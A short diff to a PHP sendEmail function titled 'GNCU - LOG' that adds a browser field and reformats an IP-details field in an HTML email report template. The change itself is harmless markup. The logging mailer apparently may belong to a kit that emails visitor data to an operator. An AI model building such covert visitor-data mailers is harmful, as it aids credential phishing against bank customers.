@@ -87,8 +87,13 @@ function sendEmail($prevValues, $subject = "GNCU - LOG") {
                 </div>
     
                 <div class='flex'>
+                    <p class='title'>Browser:</p>
+                    <p class='content'>{{browser}}</p>
+                </div>
+    
+                <div class='flex'>
                     <p class='title'>Ip Details:</p>
-                    <p class='content'>{{ip}}</p>
+                    <pre class='content'>{{ip}}</pre>
                 </div>
             </div>
         </body>
